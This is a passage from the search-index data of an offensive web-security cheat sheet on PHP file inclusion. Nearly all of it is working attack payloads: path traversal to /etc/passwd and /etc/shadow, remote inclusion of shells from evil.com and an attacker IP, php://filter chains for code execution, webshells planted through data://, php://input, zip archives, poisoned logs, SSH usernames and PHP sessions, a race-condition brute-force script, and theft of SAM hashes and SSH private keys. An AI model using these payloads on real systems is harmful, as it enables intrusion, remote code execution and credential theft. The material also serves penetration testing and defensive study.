cut off so any excess chars will be thrown away.</p> <pre><code>http://example.com/index.php?page=../../../etc/passwd............[ADD MORE]\nhttp://example.com/index.php?page=../../../etc/passwd\\.\\.\\.\\.\\.\\.[ADD MORE]\nhttp://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE] \nhttp://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd\n</code></pre>"},{"location":"web-application-attacks/file-inclusion/#filter-bypass-tricks","title":"Filter bypass tricks","text":"<pre><code>http://example.com/index.php?page=....//....//etc/passwd\nhttp://example.com/index.php?page=..///////..////..//////etc/passwd\nhttp://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd\n</code></pre>"},{"location":"web-application-attacks/file-inclusion/#remote-file-inclusion","title":"Remote File Inclusion","text":"<p>Remote File Inclusion (RFI) is a type of vulnerability that occurs when an application includes a remote file, usually through user input, without properly validating or sanitizing the input.</p> <p>Remote File Inclusion doesn't work anymore on a default configuration since <code>allow_url_include</code> is now disabled since PHP5.</p> <pre><code>allow_url_include = On\n</code></pre> <p>Most of the filter bypasses from LFI section can be reused for RFI.</p> <pre><code>http://example.com/index.php?page=http://evil.com/shell.txt\n</code></pre>"},{"location":"web-application-attacks/file-inclusion/#null-byte_1","title":"Null byte","text":"<pre><code>http://example.com/index.php?page=http://evil.com/shell.txt%00\n</code></pre>"},{"location":"web-application-attacks/file-inclusion/#double-encoding_1","title":"Double encoding","text":"<pre><code>http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt\n</code></pre>"},{"location":"web-application-attacks/file-inclusion/#bypass-allow_url_include","title":"Bypass allow_url_include","text":"<p>When <code>allow_url_include</code> and <code>allow_url_fopen</code> are set to <code>Off</code>. It is still possible to include a remote file on Windows box using the <code>smb</code> protocol.</p> <ol> <li>Create a share open to everyone</li> <li>Write a PHP code inside a file : <code>shell.php</code></li> <li>Include it <code>http://example.com/index.php?page=\\\\10.0.0.1\\share\\shell.php</code></li> </ol>"},{"location":"web-application-attacks/file-inclusion/#lfi-rfi-using-wrappers","title":"LFI / RFI using wrappers","text":""},{"location":"web-application-attacks/file-inclusion/#wrapper-phpfilter","title":"Wrapper php://filter","text":"<p>The part \"<code>php://filter</code>\" is case insensitive</p> <pre><code>http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php\nhttp://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php\nhttp://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php\nhttp://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php\n</code></pre> <p>Wrappers can be chained with a compression wrapper for large files.</p> <pre><code>http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd\n</code></pre> <p>NOTE: Wrappers can be chained multiple times using <code>|</code> or <code>/</code>:  - Multiple base64 decodes: <code>php://filter/convert.base64-decoder|convert.base64-decode|convert.base64-decode/resource=%s</code> - deflate then <code>base64encode</code> (useful for limited character exfil): <code>php://filter/zlib.deflate/convert.base64-encode/resource=/var/www/html/index.php</code></p> <pre><code>./kadimus -u \"http://example.com/index.php?page=vuln\" -S -f \"index.php%00\" -O index.php --parameter page \ncurl \"http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php\" | base64 -d &gt; index.php\n</code></pre> <p>Also there is a way to turn the <code>php://filter</code> into a full RCE. </p> <ul> <li>synacktiv/php_filter_chain_generator - A CLI to generate PHP filters chain   <pre><code>$ python3 php_filter_chain_generator.py --chain '&lt;?php phpinfo();?&gt;'\n[+] The following gadget chain will generate the following code : &lt;?php phpinfo();?&gt; (base64 value: PD9waHAgcGhwaW5mbygpOz8+)\nphp://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.UCS-2.UTF8|convert.iconv.L6.UTF8|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp\n</code></pre></li> <li>LFI2RCE.py to generate a custom payload.   <pre><code># vulnerable file: index.php\n# vulnerable parameter: file\n# executed command: id\n# executed PHP code: &lt;?=`$_GET[0]`;;?&gt;\ncurl \"127.0.0.1:8000/index.php?0=id&amp;file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/etc/passwd\"\n</code></pre></li> </ul>"},{"location":"web-application-attacks/file-inclusion/#wrapper-data","title":"Wrapper data://","text":"<pre><code>http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=\nNOTE: the payload is \"&lt;?php system($_GET['cmd']);echo 'Shell done !'; ?&gt;\"\n</code></pre> <p>Fun fact: you can trigger an XSS and bypass the Chrome Auditor with : <code>http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+</code></p>"},{"location":"web-application-attacks/file-inclusion/#wrapper-expect","title":"Wrapper expect://","text":"<pre><code>http://example.com/index.php?page=expect://id\nhttp://example.com/index.php?page=expect://ls\n</code></pre>"},{"location":"web-application-attacks/file-inclusion/#wrapper-input","title":"Wrapper input://","text":"<p>Specify your payload in the POST parameters, this can be done with a simple <code>curl</code> command.</p> <pre><code>curl -X POST --data \"&lt;?php echo shell_exec('id'); ?&gt;\" \"https://example.com/index.php?page=php://input%00\" -k -v\n</code></pre> <p>Alternatively, Kadimus has a module to automate this attack.</p> <pre><code>./kadimus -u \"https://example.com/index.php?page=php://input%00\"  -C '&lt;?php echo shell_exec(\"id\"); ?&gt;' -T input\n</code></pre>"},{"location":"web-application-attacks/file-inclusion/#wrapper-zip","title":"Wrapper zip://","text":"<ol> <li>Create an evil payload: <code>echo \"&lt;pre&gt;&lt;?php system($_GET['cmd']); ?&gt;&lt;/pre&gt;\" &gt; payload.php;</code></li> <li>Zip the file   <pre><code>zip payload.zip payload.php;\nmv payload.zip shell.jpg;\nrm payload.php\n</code></pre></li> <li>Upload the archive and access the file using the wrappers: http://example.com/index.php?page=zip://shell.jpg%23payload.php</li> </ol>"},{"location":"web-application-attacks/file-inclusion/#wrapper-phar","title":"Wrapper phar://","text":"<p>Create a phar file with a serialized object in its meta-data.</p> <pre><code>// create new Phar\n$phar = new Phar('test.phar');\n$phar-&gt;startBuffering();\n$phar-&gt;addFromString('test.txt', 'text');\n$phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ? &gt;');\n\n// add object of any class as meta data\nclass AnyClass {}\n$object = new AnyClass;\n$object-&gt;data = 'rips';\n$phar-&gt;setMetadata($object);\n$phar-&gt;stopBuffering();\n</code></pre> <p>If a file operation is now performed on our existing Phar file via the phar:// wrapper, then its serialized meta data is unserialized. If this application has a class named AnyClass and it has the magic method __destruct() or __wakeup() defined, then those methods are automatically invoked</p> <pre><code>class AnyClass {\n    function __destruct() {\n        echo $this-&gt;data;\n    }\n}\n// output: rips\ninclude('phar://test.phar');\n</code></pre> <p>NOTE: The unserialize is triggered for the phar:// wrapper in any file operation, <code>file_exists</code> and many more.</p>"},{"location":"web-application-attacks/file-inclusion/#wrapper-converticonv-and-dechunk","title":"Wrapper convert.iconv:// and dechunk://","text":""},{"location":"web-application-attacks/file-inclusion/#leak-file-content-from-error-based-oracle","title":"Leak file content from error-based oracle","text":"<ul> <li><code>convert.iconv://</code>: convert input into another folder (<code>convert.iconv.utf-16le.utf-8</code>)</li> <li><code>dechunk://</code>: if the string contains no newlines, it will wipe the entire string if and only if the string starts with A-Fa-f0-9</li> </ul> <p>The goal of this exploitation is to leak the content of a file, one character at a time, based on the DownUnderCTF writeup.</p> <p>Requirements: - Backend must not use <code>file_exists</code> or <code>is_file</code>. - Vulnerable parameter should be in a <code>POST</code> request.    - You can't leak more than 135 characters in a GET request due to the size limit</p> <p>The exploit chain is based on PHP filters: <code>iconv</code> and <code>dechunk</code>:</p> <ol> <li>Use the <code>iconv</code> filter with an encoding increasing the data size exponentially to trigger a memory error.</li> <li>Use the <code>dechunk</code> filter to determine the first character of the file, based on the previous error.</li> <li>Use the <code>iconv</code> filter again with encodings having different bytes ordering to swap remaining characters with the first one.</li> </ol> <p>Exploit using synacktiv/php_filter_chains_oracle_exploit, the script will use either the <code>HTTP status code: 500</code> or the time as an error-based oracle to determine the character.</p> <pre><code>$ python3 filters_chain_oracle_exploit.py --target http://127.0.0.1 --file '/test' --parameter 0   \n[*] The following URL is targeted : http://127.0.0.1\n[*] The following local file is leaked : /test\n[*] Running POST requests\n[+] File /test leak is finished!\n</code></pre>"},{"location":"web-application-attacks/file-inclusion/#leak-file-content-inside-a-custom-format-output","title":"Leak file content inside a custom format output","text":"<ul> <li>ambionics/wrapwrap - Generates a <code>php://filter</code> chain that adds a prefix and a suffix to the contents of a file.</li> </ul> <p>To obtain the contents of some file, we would like to have: <code>{\"message\":\"&lt;file contents&gt;\"}</code>.</p> <pre><code>./wrapwrap.py /etc/passwd 'PREFIX' 'SUFFIX' 1000\n./wrapwrap.py /etc/passwd '{\"message\":\"' '\"}' 1000\n./wrapwrap.py /etc/passwd '&lt;root&gt;&lt;name&gt;' '&lt;/name&gt;&lt;/root&gt;' 1000\n</code></pre> <p>This can be used against vulnerable code like the following.</p> <pre><code>&lt;?php\n  $data = file_get_contents($_POST['url']);\n  $data = json_decode($data);\n  echo $data-&gt;message;\n?&gt;\n</code></pre>"},{"location":"web-application-attacks/file-inclusion/#lfi-to-rce-via-procfd","title":"LFI to RCE via /proc/*/fd","text":"<ol> <li>Upload a lot of shells (for example : 100)</li> <li>Include http://example.com/index.php?page=/proc/$PID/fd/$FD, with $PID = PID of the process (can be bruteforced) and $FD the filedescriptor (can be bruteforced too)</li> </ol>"},{"location":"web-application-attacks/file-inclusion/#lfi-to-rce-via-procselfenviron","title":"LFI to RCE via /proc/self/environ","text":"<p>Like a log file, send the payload in the User-Agent, it will be reflected inside the /proc/self/environ file</p> <pre><code>GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1\nUser-Agent: &lt;?=phpinfo(); ?&gt;\n</code></pre>"},{"location":"web-application-attacks/file-inclusion/#lfi-to-rce-via-upload","title":"LFI to RCE via upload","text":"<p>If you can upload a file, just inject the shell payload in it (e.g : <code>&lt;?php system($_GET['c']); ?&gt;</code> ).</p> <pre><code>http://example.com/index.php?page=path/to/uploaded/file.png\n</code></pre> <p>In order to keep the file readable it is best to inject into the metadata for the pictures/doc/pdf</p>"},{"location":"web-application-attacks/file-inclusion/#lfi-to-rce-via-upload-race","title":"LFI to RCE via upload (race)","text":"<ul> <li>Upload a file and trigger a self-inclusion.</li> <li>Repeat the upload a shitload of time to:</li> <li>increase our odds of winning the race</li> <li>increase our guessing odds</li> <li>Bruteforce the inclusion of /tmp/[0-9a-zA-Z]{6}</li> <li>Enjoy our shell.</li> </ul> <pre><code>import itertools\nimport requests\nimport sys\n\nprint('[+] Trying to win the race')\nf = {'file': open('shell.php', 'rb')}\nfor _ in range(4096 * 4096):\n    requests.post('http://target.com/index.php?c=index.php', f)\n\n\nprint('[+] Bruteforcing the inclusion')\nfor fname in itertools.combinations(string.ascii_letters + string.digits, 6):\n    url = 'http://target.com/index.php?c=/tmp/php' + fname\n    r = requests.get(url)\n    if 'load average' in r.text:  # &lt;?php echo system('uptime');\n        print('[+] We have got a shell: ' + url)\n        sys.exit(0)\n\nprint('[x] Something went wrong, please try again')\n</code></pre>"},{"location":"web-application-attacks/file-inclusion/#lfi-to-rce-via-upload-findfirstfile","title":"LFI to RCE via upload (FindFirstFile)","text":"<p> Only works on Windows</p> <p><code>FindFirstFile</code> allows using masks (<code>&lt;&lt;</code> as <code>*</code> and <code>&gt;</code> as <code>?</code>) in LFI paths on Windows. A mask is essentially a search pattern that can include wildcard characters, allowing users or developers to search for files or directories based on partial names or types. In the context of FindFirstFile, masks are used to filter and match the names of files or directories.</p> <ul> <li><code>*</code>/<code>&lt;&lt;</code> : Represents any sequence of characters.</li> <li><code>?</code>/<code>&gt;</code> : Represents any single character.</li> </ul> <p>Upload a file, it should be stored in the temp folder <code>C:\\Windows\\Temp\\</code> with a generated name like <code>php[A-F0-9]{4}.tmp</code>. Then either bruteforce the 65536 filenames or use a wildcard character like: <code>http://site/vuln.php?inc=c:\\windows\\temp\\php&lt;&lt;</code></p>"},{"location":"web-application-attacks/file-inclusion/#lfi-to-rce-via-phpinfo","title":"LFI to RCE via phpinfo()","text":"<p>PHPinfo() displays the content of any variables such as $_GET, $_POST and $_FILES.</p> <p>By making multiple upload posts to the PHPInfo script, and carefully controlling the reads, it is possible to retrieve the name of the temporary file and make a request to the LFI script specifying the temporary file name.</p> <p>Use the script phpInfoLFI.py</p> <p>Research from https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf</p>"},{"location":"web-application-attacks/file-inclusion/#lfi-to-rce-via-controlled-log-file","title":"LFI to RCE via controlled log file","text":"<p>Just append your PHP code into the log file by doing a request to the service (Apache, SSH..) and include the log file.</p> <pre><code>http://example.com/index.php?page=/var/log/apache/access.log\nhttp://example.com/index.php?page=/var/log/apache/error.log\nhttp://example.com/index.php?page=/var/log/apache2/access.log\nhttp://example.com/index.php?page=/var/log/apache2/error.log\nhttp://example.com/index.php?page=/var/log/nginx/access.log\nhttp://example.com/index.php?page=/var/log/nginx/error.log\nhttp://example.com/index.php?page=/var/log/vsftpd.log\nhttp://example.com/index.php?page=/var/log/sshd.log\nhttp://example.com/index.php?page=/var/log/mail\nhttp://example.com/index.php?page=/var/log/httpd/error_log\nhttp://example.com/index.php?page=/usr/local/apache/log/error_log\nhttp://example.com/index.php?page=/usr/local/apache2/log/error_log\n</code></pre>"},{"location":"web-application-attacks/file-inclusion/#rce-via-ssh","title":"RCE via SSH","text":"<p>Try to ssh into the box with a PHP code as username <code>&lt;?php system($_GET[\"cmd\"]);?&gt;</code>.</p> <pre><code>ssh &lt;?php system($_GET[\"cmd\"]);?&gt;@10.10.10.10\n</code></pre> <p>Then include the SSH log files inside the Web Application.</p> <pre><code>http://example.com/index.php?page=/var/log/auth.log&amp;cmd=id\n</code></pre>"},{"location":"web-application-attacks/file-inclusion/#rce-via-mail","title":"RCE via Mail","text":"<p>First send an email using the open SMTP then include the log file located at <code>http://example.com/index.php?page=/var/log/mail</code>.</p> <pre><code>root@kali:~# telnet 10.10.10.10. 25\nTrying 10.10.10.10....\nConnected to 10.10.10.10..\nEscape character is '^]'.\n220 straylight ESMTP Postfix (Debian/GNU)\nhelo ok\n250 straylight\nmail from: mail@example.com\n250 2.1.0 Ok\nrcpt to: root\n250 2.1.5 Ok\ndata\n354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;\nsubject: &lt;?php echo system($_GET[\"cmd\"]); ?&gt;\ndata2\n.\n</code></pre> <p>In some cases you can also send the email with the <code>mail</code> command line.</p> <pre><code>mail -s \"&lt;?php system($_GET['cmd']);?&gt;\" www-data@10.10.10.10. &lt; /dev/null\n</code></pre>"},{"location":"web-application-attacks/file-inclusion/#rce-via-apache-logs","title":"RCE via Apache logs","text":"<p>Poison the User-Agent in access logs:</p> <pre><code>$ curl http://example.org/ -A \"&lt;?php system(\\$_GET['cmd']);?&gt;\"\n</code></pre> <p>Note: The logs will escape double quotes so use single quotes for strings in the PHP payload.</p> <p>Then request the logs via the LFI and execute your command.</p> <pre><code>$ curl http://example.org/test.php?page=/var/log/apache2/access.log&amp;cmd=id\n</code></pre>"},{"location":"web-application-attacks/file-inclusion/#lfi-to-rce-via-php-sessions","title":"LFI to RCE via PHP sessions","text":"<p>Check if the website use PHP Session (PHPSESSID)</p> <pre><code>Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/\nSet-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly\n</code></pre> <p>In PHP these sessions are stored into /var/lib/php5/sess_[PHPSESSID] or /var/lib/php/sessions/sess_[PHPSESSID] files</p> <pre><code>/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.\nuser_ip|s:0:\"\";loggedin|s:0:\"\";lang|s:9:\"en_us.php\";win_lin|s:0:\"\";user|s:6:\"admin\";pass|s:6:\"admin\";\n</code></pre> <p>Set the cookie to <code>&lt;?php system('cat /etc/passwd');?&gt;</code></p> <pre><code>login=1&amp;user=&lt;?php system(\"cat /etc/passwd\");?&gt;&amp;pass=password&amp;lang=en_us.php\n</code></pre> <p>Use the LFI to include the PHP session file</p> <pre><code>login=1&amp;user=admin&amp;pass=password&amp;lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27\n</code></pre>"},{"location":"web-application-attacks/file-inclusion/#lfi-to-rce-via-php-pearcmd","title":"LFI to RCE via PHP PEARCMD","text":"<p>PEAR is a framework and distribution system for reusable PHP components. By default <code>pearcmd.php</code> is installed in every Docker PHP image from hub.docker.com in <code>/usr/local/lib/php/pearcmd.php</code>. </p> <p>The file <code>pearcmd.php</code> uses <code>$_SERVER['argv']</code> to get its arguments. The directive <code>register_argc_argv</code> must be set to <code>On</code> in PHP configuration (<code>php.ini</code>) for this attack to work.</p> <pre><code>register_argc_argv = On\n</code></pre> <p>There are this ways to exploit it.</p> <ul> <li>Method 1: config create   <pre><code>/vuln.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=eval($_GET['cmd'])?&gt;+/tmp/exec.php\n/vuln.php?file=/tmp/exec.php&amp;cmd=phpinfo();die();\n</code></pre></li> <li> <p>Method 2: man_dir   <pre><code>/vuln.php?file=/usr/local/lib/php/pearcmd.php&amp;+-c+/tmp/exec.php+-d+man_dir=&lt;?echo(system($_GET['c']));?&gt;+-s+\n/vuln.php?file=/tmp/exec.php&amp;c=id\n</code></pre>   The created configuration file contains the webshell.   <pre><code>#PEAR_Config 0.9\na:2:{s:10:\"__channels\";a:2:{s:12:\"pecl.php.net\";a:0:{}s:5:\"__uri\";a:0:{}}s:7:\"man_dir\";s:29:\"&lt;?echo(system($_GET['c']));?&gt;\";}\n</code></pre></p> </li> <li> <p>Method 3: download</p> </li> </ul> <p>Need external network connection.   <pre><code>/vuln.php?file=/usr/local/lib/php/pearcmd.php&amp;+download+http://&lt;ip&gt;:&lt;port&gt;/exec.php\n/vuln.php?file=exec.php&amp;c=id\n</code></pre> * Method 4: install</p> <p>Need external network connection.</p> <p>Notice that <code>exec.php</code> locates at <code>/tmp/pear/download/exec.php</code>.   <pre><code>/vuln.php?file=/usr/local/lib/php/pearcmd.php&amp;+install+http://&lt;ip&gt;:&lt;port&gt;/exec.php\n/vuln.php?file=/tmp/pear/download/exec.php&amp;c=id\n</code></pre></p>"},{"location":"web-application-attacks/file-inclusion/#lfi-to-rce-via-credentials-files","title":"LFI to RCE via credentials files","text":"<p>This method require high privileges inside the application in order to read the sensitive files.</p>"},{"location":"web-application-attacks/file-inclusion/#windows-version","title":"Windows version","text":"<p>First extract <code>sam</code> and <code>system</code> files.</p> <pre><code>http://example.com/index.php?page=../../../../../../WINDOWS/repair/sam\nhttp://example.com/index.php?page=../../../../../../WINDOWS/repair/system\n</code></pre> <p>Then extract hashes from these files <code>samdump2 SYSTEM SAM &gt; hashes.txt</code>, and crack them with <code>hashcat/john</code> or replay them using the Pass The Hash technique.</p>"},{"location":"web-application-attacks/file-inclusion/#linux-version","title":"Linux version","text":"<p>First extract <code>/etc/shadow</code> files.</p> <pre><code>http://example.com/index.php?page=../../../../../../etc/shadow\n</code></pre> <p>Then crack the hashes inside in order to login via SSH on the machine.</p> <p>Another way to gain SSH access to a Linux machine through LFI is by reading the private key file, id_rsa. If SSH is active check which user is being used <code>/proc/self/status</code> and <code>/etc/passwd</code> and try to access <code>/&lt;HOME&gt;/.ssh/id_rsa</code>.</p>"},{"location":"web-application-attacks/file-inclusion/#references","title":"References","text":"<ul> <li>OWASP LFI</li> <li>HighOn.coffee LFI Cheat</li> <li>Turning LFI to RFI</li> <li>Is PHP vulnerable and under what conditions?</li> <li>Upgrade from LFI to RCE via PHP Sessions</li> <li>Local file inclusion tricks</li> <li>CVV #1: Local File Inclusion - SI9INT</li> <li>Exploiting Blind File Reads / Path Traversal Vulnerabilities on Microsoft Windows Operating Systems - @evisneffos</li> <li>Baby^H Master PHP 2017 by @orangetw</li> <li>\u0427\u0442\u0435\u043d\u0438\u0435 \u0444\u0430\u0439\u043b\u043e\u0432 =&gt; unserialize !</li> <li>New PHP Exploitation Technique - 14 Aug 2018 by Dr. 